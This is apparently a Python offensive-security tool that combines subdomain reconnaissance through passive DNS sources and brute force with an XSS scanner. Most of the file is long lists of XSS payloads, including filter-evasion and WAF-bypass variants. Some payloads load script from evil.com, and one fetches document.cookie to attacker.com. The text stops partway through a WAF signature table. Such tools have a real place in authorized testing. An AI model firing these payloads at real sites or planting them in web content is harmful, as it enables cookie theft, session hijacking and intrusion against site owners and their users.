#!/usr/bin/env python3
"""
Advanced XSS Scanner for Linux
Automatically discovers endpoints, parameters, and tests XSS payloads
Creator: Subhajit

Author: Subhajit
License: For authorized security testing only
"""

import argparse
import re
import sys
import socket
import time
import random
import concurrent.futures

# Force UTF-8 output for Windows
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, urlunsplit
from collections import deque
from datetime import datetime, timedelta


try:
    import requests
    from bs4 import BeautifulSoup
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[*] Install with: pip3 install requests beautifulsoup4")
    sys.exit(1)

# Color is optional. The desktop UI and redirected CLI output work without it.
try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    class _NoColor:
        def __getattr__(self, _name):
            return ""
    Fore = Style = Back = _NoColor()
    def init(*_args, **_kwargs):
        return None

# Suppress XML parsing warnings from BeautifulSoup
import warnings
try:
    from bs4 import XMLParsedAsHTMLWarning
    warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
except ImportError:
    pass  # Older versions of bs4 don't have this warning

try:
    import dns.resolver
except ImportError:
    print(f"[!] Missing dependency: dnspython")
    print("[*] Install with: pip3 install dnspython")
    sys.exit(1)


# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SubdomainScanner:
    """Subdomain discovery tool using online sources and brute force"""
    
    WORDLIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/DNS/subdomains-top1million-110000.txt"

    
    def __init__(self, domain, wordlist=None):
        # Extract hostname if URL is provided
        if '://' in domain:
            parsed = urlparse(domain)
            self.domain = parsed.netloc
        else:
            self.domain = domain
        
        # Remove path/params if user provided "example.com/path"
        if '/' in self.domain:
            self.domain = self.domain.split('/')[0]
            
        self.wordlist = wordlist
        self.found_subdomains = set()
        
    def resolve_domain(self, domain):
        """Resolve domain using rotating public DNS servers (Sublist3r logic)"""
        try:
            resolver = dns.resolver.Resolver()
            # Public DNS servers (Google, Cloudflare, Quad9, OpenDNS, Level3)
            nameservers = [
                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', 
                '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
                '64.6.64.6', '64.6.65.6', '84.200.69.80', '84.200.70.40'
            ]
            resolver.nameservers = [random.choice(nameservers)]
            resolver.lifetime = 2.0
            resolver.timeout = 2.0
            
            # Query for A record
            answers = resolver.resolve(domain, 'A')
            if answers:
                return True
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout, dns.exception.DNSException):
            return False
        except Exception:
            return False
        return False

            
    def online_recon(self):
        print(f"\n{Fore.CYAN}[*] Starting online subdomain discovery (Passive DNS)...{Style.RESET_ALL}")
        all_candidates = set()

        
        # crt.sh
        try:
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry['name_value']
                    subdomains = name_value.split('\n')
                    for subdomain in subdomains:
                        if self.domain in subdomain and '*' not in subdomain:
                            all_candidates.add(subdomain.strip())


        except Exception:
            pass
            
        # Hackertarget
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                for line in response.text.split('\n'):
                     if ',' in line:
                         subdomain = line.split(',')[0]
                         if self.domain in subdomain:
                             clean_sub = subdomain.strip()
                             all_candidates.add(clean_sub)


        except Exception:
            pass
                    
        # AlienVault OTX
        try:
            url = f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for entry in data.get('passive_dns', []):
                    hostname = entry.get('hostname')
                    if hostname and self.domain in hostname and '*' not in hostname:
                        all_candidates.add(hostname.strip())
        except Exception:
            pass
            
        # Anubis
        try:
            url = f"https://jldc.me/anubis/subdomains/{self.domain}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for subdomain in data:
                    if self.domain in subdomain and '*' not in subdomain:
                        all_candidates.add(subdomain.strip())
        except Exception:
            pass
            
        # URLScan
        try:
            url = f"https://urlscan.io/api/v1/search/?q=domain:{self.domain}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for entry in data.get('results', []):
                    page_domain = entry.get('page', {}).get('domain')
                    if page_domain and self.domain in page_domain:
                        all_candidates.add(page_domain.strip())
        except Exception:
            pass
            
        # ThreatMiner
        try:
            url = f"https://api.threatminer.org/v2/domain.php?q={self.domain}&rt=5"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for subdomain in data.get('results', []):
                    if self.domain in subdomain and '*' not in subdomain:
                        all_candidates.add(subdomain.strip())
        except Exception:
            pass

        # RapidDNS
        try:
            url = f"https://rapiddns.io/subdomain/{self.domain}?full=1"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                # Simple regex extraction to avoid soup overhead if possible, or robust parsing
                # RapidDNS fits in a table usually
                import re
                found = re.findall(r'<td>([\w\.-]+)</td>', response.text)
                for subdomain in found:
                    if self.domain in subdomain and '*' not in subdomain:
                        all_candidates.add(subdomain.strip())
        except Exception:
            pass

        # C99.nl
        # C99.nl (Check last 5 days for cached scans)
        for i in range(5):
            try:
                date_str = (datetime.now() - timedelta(days=i)).strftime('%Y-%m-%d')
                url = f"https://subdomainfinder.c99.nl/scans/{date_str}/{self.domain}"
                
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = soup.find_all('a', href=True)
                    found_count = 0
                    for link in links:
                        href = link['href']
                        # C99 links format: //subdomain.domain.com or https://...
                        if self.domain in href:
                             # Clean up protocol and path
                             sub = href.replace('http://', '').replace('https://', '').replace('//', '').split('/')[0]
                             if self.domain in sub and '*' not in sub:
                                 all_candidates.add(sub.strip())
                                 found_count += 1
                                 
                    if found_count > 0:
                        # If we found data for a recent date, scanning further dates might be redundant but okay
                        print(f"{Fore.CYAN}[*] Found cached C99.nl scan from {date_str}{Style.RESET_ALL}")
                        break
            except Exception:
                pass



            
        print(f"{Fore.CYAN}[*] Validating {len(all_candidates)} potential subdomains from online sources...{Style.RESET_ALL}")
        self.verify_subdomains(all_candidates)
        print(f"{Fore.GREEN}[+] Online recon complete. Total checked: {len(all_candidates)}. Valid found: {len(self.found_subdomains)}{Style.RESET_ALL}")

    def verify_subdomains(self, candidates):
        """Verify if subdomains resolve to an IP"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            future_to_sub = {
                executor.submit(self.resolve_domain, sub): sub
                for sub in candidates
            }
            
            for future in concurrent.futures.as_completed(future_to_sub):
                subdomain = future_to_sub[future]
                try:
                    is_valid = future.result()
                    if is_valid:
                        if subdomain not in self.found_subdomains:
                            self.found_subdomains.add(subdomain)
                            print(f"{Fore.GREEN}[+] Found [{len(self.found_subdomains)}]: {subdomain}{Style.RESET_ALL}")
                except Exception:
                    pass


    def brute_force(self):
        print(f"\n{Fore.CYAN}[*] Starting local subdomain brute force...{Style.RESET_ALL}")

        
        # Default common subdomains
        common_subs = [
            'www', 'mail', 'remote', 'blog', 'webmail', 'server', 'ns1', 'ns2', 'smtp', 'secure',
            'vpn', 'm', 'shop', 'ftp', 'mail2', 'test', 'portal', 'ns', 'ww1', 'host',
            'support', 'dev', 'web', 'bbs', 'ww42', 'mx', 'email', 'cloud', '1', 'mail1',
            '2', 'forum', 'owa', 'www2', 'gw', 'admin', 'store', 'mx1', 'cdn', 'api',
            'exchange', 'app', 'gov', 'tmp', 'vps', 'gov.cn', 'news', 'member', 'img',
            'pop', 'market', 'sso', 'login', 'dashboard', 'erp', 'crm', 'docs', 'files',
            'autodiscover', 'calendar', 'video', 'images', 'static', 'assets', 'git', 'gitlab',
            'jenkins', 'manage', 'manager', 'account', 'accounts', 'user', 'users', 'auth',
            'staging', 'stage', 'beta', 'demo', 'test1', 'test2', 'dev1', 'dev2', 'uat',
            'intranet', 'wiki', 'kb', 'help', 'status', 'monitor', 'zabbix', 'nagios', 'grafana',
            'cpanel', 'whm', 'plesk', 'db', 'database', 'sql', 'mysql', 'mssql', 'postgres',
            'oracle', 'redis', 'mongo', 'elasticsearch', 'elastic', 'kibana', 'log', 'logs'
        ]
        
        # Load from file if provided or download default
        if self.wordlist:
            try:
                with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    common_subs = [line.strip() for line in f if line.strip()]
                print(f"{Fore.GREEN}[+] Loaded {len(common_subs)} subdomains from custom wordlist{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error reading wordlist: {e}{Style.RESET_ALL}")
        elif not self.wordlist:
            # Check for local default wordlist or download
            wordlist_path = "subdomains.txt"
            import os
            if not os.path.exists(wordlist_path):
                print(f"{Fore.YELLOW}[*] Default wordlist not found. Downloading top 110,000 subdomains...{Style.RESET_ALL}")
                try:
                    response = requests.get(self.WORDLIST_URL, timeout=30)
                    if response.status_code == 200:
                        with open(wordlist_path, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"{Fore.GREEN}[+] Successfully downloaded default wordlist!{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] Failed to download wordlist. Using internal fallback.{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[!] Download error: {e}. Using internal fallback.{Style.RESET_ALL}")
            
            # Try to load the downloaded/existing wordlist
            if os.path.exists(wordlist_path):
                try:
                    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        file_subs = [line.strip() for line in f if line.strip()]
                    if file_subs:
                        common_subs = file_subs
                        print(f"{Fore.GREEN}[+] Loaded {len(common_subs)} subdomains from default wordlist{Style.RESET_ALL}")
                except Exception:
                    pass

        
        found_new = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            future_to_sub = {
                executor.submit(self.resolve_domain, f"{sub}.{self.domain}"): f"{sub}.{self.domain}" 
                for sub in common_subs
            }
            
            for future in concurrent.futures.as_completed(future_to_sub):
                subdomain = future_to_sub[future]
                try:
                    is_valid = future.result()
                    if is_valid:
                        if subdomain not in self.found_subdomains:
                            self.found_subdomains.add(subdomain)
                            found_new += 1
                            print(f"{Fore.GREEN}[+] Found [{len(self.found_subdomains)}]: {subdomain}{Style.RESET_ALL}")
                except Exception:

                    pass
                    
        print(f"{Fore.GREEN}[+] Brute force found {found_new} new subdomains{Style.RESET_ALL}")

    def run(self):
        self.print_banner()
        self.online_recon()
        self.brute_force()
        print(f"\n{Fore.CYAN}[*] Subdomain discovery complete.{Style.RESET_ALL}")
        if self.found_subdomains:
            print(f"{Fore.GREEN}[+] Total unique subdomains found: {len(self.found_subdomains)}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}{'='*50}{Style.RESET_ALL}")
            for sub in sorted(list(self.found_subdomains)):
                print(sub)
            print(f"{Fore.WHITE}{'='*50}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] No subdomains found.{Style.RESET_ALL}")

    def print_banner(self):
        print(f"""
{Fore.CYAN}╔{'═'*50}╗
{Fore.CYAN}║   {Fore.YELLOW}🔎 Subdomain Discovery Module{Fore.CYAN}                  ║
{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}
""")

class XSSScanner:
    """Advanced XSS Vulnerability Scanner"""
    
    # Advanced XSS Payloads with various bypass techniques
    PAYLOADS = [
        # =================================================================
        # BASIC SCRIPT INJECTION
        # =================================================================
        '<script>alert("XSS")</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(document.domain)</script>',
        '<script>alert(document.cookie)</script>',
        '<script>alert(1)</script>',
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
        '<script src=//evil.com/xss.js></script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>setTimeout("alert(1)",0)</script>',
        '<script>setInterval("alert(1)",0)</script>',
        '<script>Function("alert(1)")()</script>',
        '<script>[].constructor.constructor("alert(1)")()</script>',
        
        # =================================================================
        # EVENT HANDLER PAYLOADS
        # =================================================================
        '<img src=x onerror=alert("XSS")>',
        '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
        '<img/src/onerror=alert(1)>',
        '<img src=x:x onerror=alert(1)>',
        '<body onload=alert("XSS")>',
        '<body onpageshow=alert(1)>',
        '<body onhashchange=alert(1)>',
        '<body onscroll=alert(1)>',
        '<svg onload=alert("XSS")>',
        '<svg/onload=alert("XSS")>',
        '<svg onload=alert(1)//',
        '<input onfocus=alert("XSS") autofocus>',
        '<input type=image src=x onerror=alert(1)>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<marquee onstart=alert("XSS")>',
        '<marquee onfinish=alert(1)>',
        '<video><source onerror="alert(\'XSS\')">',
        '<video src=x onerror=alert(1)>',
        '<video poster=javascript:alert(1)>',
        '<audio src=x onerror=alert("XSS")>',
        '<audio src onerror=alert(1)>',
        '<details open ontoggle=alert("XSS")>',
        '<details/open/ontoggle=alert(1)>',
        '<object data="javascript:alert(\'XSS\')">',
        '<object data=data:text/html,<script>alert(1)</script>>',
        '<iframe onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<button onclick=alert(1)>click</button>',
        '<button formaction=javascript:alert(1)>click</button>',
        '<form><button formaction=javascript:alert(1)>X</button>',
        '<isindex type=image src=x onerror=alert(1)>',
        '<embed src="javascript:alert(1)">',
        '<a href=javascript:alert(1)>click</a>',
        '<a href="javascript:alert(1)">XSS</a>',
        '<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>',
        '<math><maction xlink:href=javascript:alert(1)>click</maction></math>',
        '<form action=javascript:alert(1)><input type=submit>',
        
        # =================================================================
        # SVG PAYLOADS
        # =================================================================
        '<svg><script>alert("XSS")</script></svg>',
        '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
        '<svg><set onbegin=alert("XSS") attributename=x>',
        '<svg><a xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>',
        '<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiPjxhIHhsaW5rOmhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPjxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiAvPjwvYT48L3N2Zz4=#x>',
        '<svg><script xlink:href=data:,alert(1) />',
        '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject></svg>',
        '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>',
        '<svg><image xlink:href=x onerror=alert(1)/>',
        '<svg><feImage xlink:href=javascript:alert(1)/>',
        '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="data:application/xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4KPC9zdmc+#x"></use></svg>',
        
        # =================================================================
        # MUTATION XSS (mXSS)
        # =================================================================
        '<noscript><p title="</noscript><script>alert(1)</script>">',
        '<p style="animation-name:x" onanimationstart="alert(1)">',
        '<style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)">',
        '<table background=javascript:alert(1)>',
        '<table><td background=javascript:alert(1)>',
        '<title><img src=x onerror=alert(1)>',
        '<style><img onerror=alert(1) src=x></style>',
        '<xmp><img onerror=alert(1) src=x>',
        '<listing><img onerror=alert(1) src=x>',
        '<frameset onload=alert(1)>',
        '<base href="javascript:/a/-alert(1)///////">',
        
        # =================================================================
        # ENCODED PAYLOADS (HTML ENTITIES)
        # =================================================================
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
        '&#0000060script&#0000062alert(1)&#0000060/script&#0000062',
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>',
        '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">click</a>',
        
        # =================================================================
        # URL ENCODED PAYLOADS
        # =================================================================
        '%3Cscript%3Ealert("XSS")%3C/script%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%3E',
        '%3Csvg%20onload%3Dalert(1)%3E',
        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
        '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
        
        # =================================================================
        # UNICODE/UTF-8 PAYLOADS
        # =================================================================
        '<script>alert(\u0022XSS\u0022)</script>',
        '<img src=x onerror=\u0061\u006c\u0065\u0072\u0074("XSS")>',
        '<script>\u0061\u006C\u0065\u0072\u0074(1)</script>',
        '<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">',
        '＜script＞alert(1)＜/script＞',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<scr\x09ipt>alert(1)</scr\x09ipt>',
        '<scr\x0aipt>alert(1)</scr\x0aipt>',
        
        # =================================================================
        # CASE VARIATION BYPASS
        # =================================================================
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<IMG SRC=x ONERROR=alert("XSS")>',
        '<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>',
        '<sVg OnLoAd=alert(1)>',
        '<iMg SrC=x OnErRoR=alert(1)>',
        '<bOdY oNlOaD=alert(1)>',
        
        # =================================================================
        # NULL BYTE INJECTION
        # =================================================================
        '<scri%00pt>alert("XSS")</scri%00pt>',
        '<img src=x onerror=alert("XSS")%00>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<svg/\x00onload=alert(1)>',
        'java\x00script:alert(1)',
        
        # =================================================================
        # COMMENT & WHITESPACE BYPASS
        # =================================================================
        '<script>/**/alert("XSS")/**/</script>',
        '<img src=x onerror=/**/alert("XSS")/**/>',
        '<script>alert/**/(\'XSS\')</script>',
        '<!--><script>alert(1)</script-->',
        '<script><!--\nalert(1)//--></script>',
        '<script>alert(1)//</script>',
        
        # =================================================================
        # TAB/NEWLINE BYPASS
        # =================================================================
        '<script>\talert("XSS")</script>',
        '<script>\nalert("XSS")\n</script>',
        '<img\nsrc=x\nonerror=alert("XSS")>',
        '<img\tsrc=x\tonerror=alert("XSS")>',
        '<img\r\nsrc=x\r\nonerror=alert(1)>',
        '<script\x0d>alert(1)</script>',
        '<script\x0a>alert(1)</script>',
        '<a\x09href=javascript:alert(1)>click',
        '<a\x0ahref=javascript:alert(1)>click',
        
        # =================================================================
        # PROTOCOL HANDLERS
        # =================================================================
        'javascript:alert("XSS")',
        'java\nscript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'javascript://%0aalert(1)',
        'javascript:/**/alert(1)',
        'javascript:\u0061lert(1)',
        'vbscript:msgbox(1)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:image/svg+xml,<svg onload=alert(1)>',
        'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+',
        
        # =================================================================
        # CSS/STYLE INJECTION
        # =================================================================
        '<div style="background:url(javascript:alert(\'XSS\'))">',
        '<div style="width:expression(alert(\'XSS\'))">',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<link rel=stylesheet href=data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOnVybCgiamF2YXNjcmlwdDphbGVydCgxKSIpfQ==>',
        '<div style="-moz-binding:url(http://evil.com/xss.xml#xss)">',
        '<xss style="behavior:url(xss.htc)">',
        '<style>*{background-image:url("javascript:alert(1)")}</style>',
        
        # =================================================================
        # TEMPLATE INJECTION
        # =================================================================
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '${alert("XSS")}',
        '#{alert("XSS")}',
        '{{7*7}}',
        '${{7*7}}',
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{[].constructor.constructor("alert(1)")()}}',
        '{{this.constructor.constructor("alert(1)")()}}',
        '<%= 7*7 %>',
        '${{"a".constructor.prototype.charAt=[].join;$eval("x]alert(1)//");}}',
        
        # =================================================================
        # ATTRIBUTE BREAKING
        # =================================================================
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        '"></script><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        "' onclick=alert('XSS')//",
        '" onclick=alert("XSS")//',
        '" onfocus=alert("XSS") autofocus="',
        "' onfocus=alert('XSS') autofocus='",
        '"><svg onload=alert(1)>',
        "'><svg onload=alert(1)>",
        '"onmouseover="alert(1)',
        "'onmouseover='alert(1)",
        '"><body onload=alert(1)>',
        '" onload="alert(1)',
        '\'>" onmouseover="alert(1)" style="',
        
        # =================================================================
        # JAVASCRIPT CONTEXT BREAKING
        # =================================================================
        '</script><script>alert("XSS")</script>',
        "';alert('XSS');//",
        '";alert("XSS");//',
        "'-alert('XSS')-'",
        '"-alert("XSS")-"',
        r"\';alert(1)//",
        r'\";alert(1)//',
        '</script><svg onload=alert(1)>',
        "'-eval(atob('YWxlcnQoMSk='))-'",
        r"\x3cscript\x3ealert(1)\x3c/script\x3e",
        r"\u003cscript\u003ealert(1)\u003c/script\u003e",
        
        # =================================================================
        # DOM-BASED PAYLOADS
        # =================================================================
        '#<script>alert("XSS")</script>',
        '?default=<script>alert("XSS")</script>',
        '#<img src=x onerror=alert(1)>',
        '?search=<script>alert(1)</script>',
        '?q=<img/src=x onerror=alert(1)>',
        '#><script>alert(1)</script>',
        'javascript:alert(document.domain)',
        '#javascript:alert(1)',
        
        # =================================================================
        # FILTER EVASION
        # =================================================================
        '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
        '<<script>script>alert("XSS")</script>',
        '<script x>alert("XSS")</script x>',
        '<scr\nipt>alert(1)</scr\nipt>',
        '<scr\tipt>alert(1)</scr\tipt>',
        '<sc\x00ript>alert(1)</sc\x00ript>',
        '<script/random>alert(1)</script>',
        '<img src="x`"onerror="alert(1)">',
        '<img src=x` onerror=alert(1)>',
        '<img src="x" onerror=`alert(1)`>',
        
        # =================================================================
        # WAF BYPASS TECHNIQUES
        # =================================================================
        '<svg/onload=alert(1)>',
        '<svg///////onload=alert(1)>',
        '<svg id=x;onload=alert(1)>',
        '<svg onload=alert(1)///',
        '<math><mtext><table><mglyph><style><img src onerror=alert(1)>',
        '<math><mrow><mi><table><mglyph><style><img src onerror=alert(1)>',
        '<script>alert`1`</script>',
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror="alert\x281\x29">',
        '<svg><script>alert&#40;1&#41;</script></svg>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        '<script>onerror=alert;throw 1</script>',
        '<script>{onerror=alert}throw 1</script>',
        '<script>throw Error(1).then(alert)</script>',
        '<body onload=alert(1)>',
        '<body/onload=alert(1)>',
        '<x onclick=alert(1)>click here',
        '<svg><x><script>alert(1)</x></script>',
        '<script y="><">alert(1)</script>',
        '<script>alert(1);</script test=',
        '<script>alert(1)//<',
        '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
        '<img src=x:alert(alt) onerror=eval(src) alt=1>',
        '<img src=javascript:alert(1)>',
        '<a href=# onfocus=alert(1) autofocus>',
        
        # =================================================================
        # PROTOTYPE POLLUTION
        # =================================================================
        '__proto__[innerHTML]=<img src=x onerror=alert(1)>',
        'constructor[prototype][innerHTML]=<img/src=x onerror=alert(1)>',
        '__proto__.innerHTML=<img/src onerror=alert(1)>',
        
        # =================================================================
        # POLYGLOT PAYLOADS
        # =================================================================
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        '"><img src=x id=confirm(1) onerror=eval(id)>',
        "'\"><img src=x onerror=alert(document.domain)>/",
        '"><svg/onload=alert(1)//"',
        "'><img src=x onerror=alert(1)>//",
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        "<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%29`>",
        '--!><svg/onload=alert(1)>',
        '<svg><animate xlink:href="#x" attributeName="href" values="javascript:alert(1)" /></svg>',
        '<math><a xlink:href="javascript:alert(1)">click',
    ]
    
    # =================================================================
    # WAF BYPASS SPECIFIC PAYLOADS (Prioritized in WAF Mode)
    # =================================================================
    WAF_BYPASS_PAYLOADS = [
        # POLYGLOTS
        'javascript://%250Aalert(1)//',
        '<svg/onload=alert(1)<!--',
        '\'"><svg/onload=alert(1)>',
        '/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        
        # PROTOCOL OBSCURITY
        '<a href="javas\x00cript:alert(1)">click</a>',
        '<a href="javascript:x=\'&#64;\';alert(1)">click</a>',
        '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>',
        
        # MATH/SVG CHAINS
        '<math><mtext><table><mglyph><style><img src onerror=alert(1)>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributename=x>',
        
        # ES6 / MODERN JS
        '<script>x=>1;alert(1)</script>',
        '<script>[(1,2)].find(alert)</script>',
        '<script>fetch("https://attacker.com?cookie="+document.cookie)</script>',
        
        # DOUBLE/TRIPLE ENCODING & NULL BYTES
        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
        '%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E',
        
        # FRAMEWORK/TEMPLATE INJECTION
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        
        # CLOUDFLARE / AKAMAI / GENERAL BYPASS ATTEMPTS
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror=alert&lpar;1&rpar;>',
        '<svg/onload=alert&lpar;1&rpar;>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<body onpageshow=alert(1)>',
        '<body onfocus=alert(1)>',
        '<details ontoggle=alert(1)>',
        '<div contextmenu=x oncontextmenu=alert(1)>',
        '<input type="search" onsearch="alert(1)">',
        
        # UNUSUAL TAGS/HANDLERS
        '<marquee onstart=alert(1)>',
        '<video oncanplay=alert(1)>',
        '<audio ondurationchange=alert(1)>',
        '<keygen onfocus=alert(1)>',
        
        # NESTED / MALFORMED
        '<scr<script>ipt>alert(1)</script>',
        '<<script>alert(1)//<</script>',
        '<script>/*//*/alert(1)//</script>',
        
        # DATA URI
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        
        # MORE ADVANCED
        '<x onclick=alert(1) src=a>Click',
        '<x onmouseover=alert(1) src=a>Hover',
        '<svg/onload=location="javas"+"cript:ale"+"rt(1)">',
        '<script>window["alert"](1)</script>',
        '<script>parent["alert"](1)</script>',
        '<script>self["alert"](1)</script>',
        '<script>top["alert"](1)</script>',
    ]
    
    # WAF Detection Signatures - ULTRA Comprehensive Database (160+ WAFs)
    WAF_SIGNATURES = {
        # ═══════════════════════════════════════════════════════════════════
        # 360 TECHNOLOGIES
        # ═══════════════════════════════════════════════════════════════════
        '360panyun': {
            'headers': ['x-360-', 'x-panyun-'],
            'server': ['360panyun'],
            'body': ['360 panyun', '360 technologies'],
        },
        '360wangzhanbao': {
            'headers': ['x-360-wzb'],
            'body': ['360wangzhanbao', '360 technologies', 'wangzhanbao'],
        },
        '360waf': {
            'headers': ['x-360-', 'qihoo'],
            'server': ['360wzws'],
            'body': ['360 web security', '360wzws', 'qihoo', '360safe'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # MAJOR CLOUD/CDN WAFs
        # ═══════════════════════════════════════════════════════════════════
        'cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid', 'cf-connecting-ip', 'cf-ipcountry', 'cf-visitor'],
            'server': ['cloudflare', 'cloudflare-nginx'],
            'body': ['attention required! | cloudflare', 'cloudflare ray id:', 'please turn javascript on and reload the page', 'ddos protection by cloudflare', 'error 1020', 'error 1015', 'error 1012', 'ray id:', 'performance & security by cloudflare'],
            'cookies': ['__cfduid', 'cf_clearance', '__cf_bm', 'cf_ob_info', 'cf_use_ob'],
        },
        'cloudfloor': {
            'headers': ['x-cloudfloor-'],
